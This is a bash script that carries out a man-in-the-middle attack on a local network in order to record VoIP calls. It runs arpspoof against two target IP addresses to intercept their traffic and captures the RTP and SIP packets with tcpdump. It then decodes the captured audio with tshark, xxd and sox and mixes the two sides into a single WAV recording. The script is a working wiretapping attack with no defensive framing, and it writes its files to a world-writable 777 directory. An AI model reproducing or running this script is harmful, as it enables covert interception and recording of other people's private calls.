#!/bin/bash

ip1=$1
ip2=$2
# sip_port $3
# filename $4

#echo "argv 1: $1"
#echo "argv 2: $2"

filename=$4
wavname=$ip1"_"$ip2

dir="./file"
filedir="$dir/$5"
mkdir -m 777 $filedir

oldwav=$wavname".wav"
newwav=$5".wav"

old="$filedir/$oldwav"
new="$filedir/$newwav"

# ping google.com > /dev/null & 

function trap_exec {
	kill $(jobs -pr)
	opt="rtp&&!icmp"

	ip1_opt="ip.src==$ip1&&$opt"
	ip2_opt="ip.src==$ip2&&$opt"

	echo $ip1_opt
	echo $ip2_opt
	echo $3
	tshark -2 -r "$filedir/$filename" -R "$ip1_opt" -T fields -e rtp.seq -e rtp.payload | awk -f filter.awk > "$filedir/$ip1"
	tshark -2 -r "$filedir/$filename" -R "$ip2_opt" -T fields -e rtp.seq -e rtp.payload | awk -f filter.awk > "$filedir/$ip2"

	xxd -r -p  "$filedir/$ip1" > "$filedir/$ip1.xxd"
	xxd -r -p  "$filedir/$ip2" > "$filedir/$ip2.xxd"

	sox -c 1 -t raw -r 8000 -e a-law "$filedir/$ip1.xxd" "$filedir/$ip1.wav"
	sox -c 1 -t raw -r 8000 -e a-law "$filedir/$ip2.xxd" "$filedir/$ip2.wav"
	sox -m "$filedir/$ip1.wav" "$filedir/$ip2.wav" "$filedir/$wavname.wav"

	mv $old $new

	exit
}
trap trap_exec SIGTERM
#./tshark_test.sh $1 $2 $filename;

#ping google.com > /dev/null &
# ./pings.sh 192.168.1.35 192.168.1.18 5060
#tcpdump host $ip1 and host $ip2 and (portrange 7000-8000 or port tap_port) -w ttt
arpspoof -t $1 $2 -r  &> /dev/null &
tcpdump "host $1 and host $2 and (portrange 7000-8000 or port $3)" -w "$filedir/$filename" &

while :
do
 	sleep 10
done